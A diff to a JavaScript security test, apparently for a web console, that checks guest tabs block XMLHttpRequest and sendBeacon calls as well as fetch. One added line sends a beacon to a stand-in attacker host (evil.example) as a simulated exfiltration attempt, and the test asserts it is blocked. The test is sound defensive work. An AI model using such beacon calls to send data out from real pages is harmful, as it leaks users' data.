@@ -62,6 +62,14 @@ test('a guest tab calls the share\'s four operations and NOTHING else', { skip }
   assert.deepEqual(tries, [403, 403, 403, 403, 403, 403, 403]);
   assert.equal(ctx.engine.state.log.length, n, 'none of them reached the server');
   assert.equal(await page.eval('window.__xerjGuestBlocked.length'), 7);
+  // …and so is an XMLHttpRequest or a beacon (PR #945 review: only fetch was guarded).
+  const xhr = await page.eval(`(() => { try { const x = new XMLHttpRequest(); x.open('GET', '/_xerj-console/api/v1/me'); x.send(); return 'sent'; } catch (e) { return e.name; } })()`);
+  assert.equal(xhr, 'SecurityError');
+  const beacon = await page.eval(`[navigator.sendBeacon('https://evil.example/b', 'k'), navigator.sendBeacon('/_xerj-console/api/v1/audit', 'k')]`);
+  assert.deepEqual(beacon, [false, false]);
+  await sleep(150);
+  assert.equal(ctx.engine.state.log.length, n, 'neither reached the server');
+  assert.deepEqual(await page.eval('window.__xerjGuestBlocked.slice(7)'), ['XHR GET /_xerj-console/api/v1/me', 'BEACON POST https://evil.example', 'BEACON POST /_xerj-console/api/v1/audit']);
   await assertNotPwned(page, ctx.engine.origin, 'guest authz');
   await page.close();
 });
